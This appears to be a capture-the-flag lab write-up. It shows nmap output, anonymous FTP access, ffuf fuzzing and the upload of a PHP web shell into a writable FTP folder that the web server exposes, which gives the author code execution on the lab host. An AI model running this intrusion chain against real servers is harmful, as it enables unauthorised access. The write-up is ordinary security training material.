


Nmap scan
```
sudo nmap -sV -sC 10.10.30.21 -Pn -n
Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-26 22:53 CET
Nmap scan report for 10.10.30.21
Host is up (0.038s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.9.196.149
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Able to connect anonymously to the ftp server:
```
ftp 10.10.30.21
Connected to 10.10.30.21.
220 (vsFTPd 3.0.3)
Name (10.10.30.21:elomarii): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||34705|)
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
```

Content of notice.txt
```
cat notice.txt 
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```
The meme we're talking about `important.jpg`
![important](https://github.com/elomarii/CTF_4_DAY/assets/106914699/9b8c7cb6-ff1b-491c-98d3-14e77a032c67)

Web app fuzzing:
```
ffuf -w ~/Downloads/common.txt:FUZZ -u http://10.10.30.21/FUZZ 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.30.21/FUZZ
 :: Wordlist         : FUZZ: /home/elomarii/Downloads/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

files                   [Status: 301, Size: 310, Words: 20, Lines: 10]
```

The `/files` allows us to access the files of the ftp server.
We can upload our shell to the server and then include it from the web app to achieve RCE.
Note that uploading the file to the main directory will not succeed. This is possible, however, in the `ftp` folder.

```
ftp> put shell.php
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||21801|)
553 Could not create file.

ftp> cd ftp
250 Directory successfully changed.

ftp> put shell.php 
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||22501|)
150 Ok to send data.
100% |*************************************************|   732        9.06 MiB/s    00:00 ETA
226 Transfer complete.
732 bytes sent in 00:00 (8.78 KiB/s)
```

Now we have access to the machine.





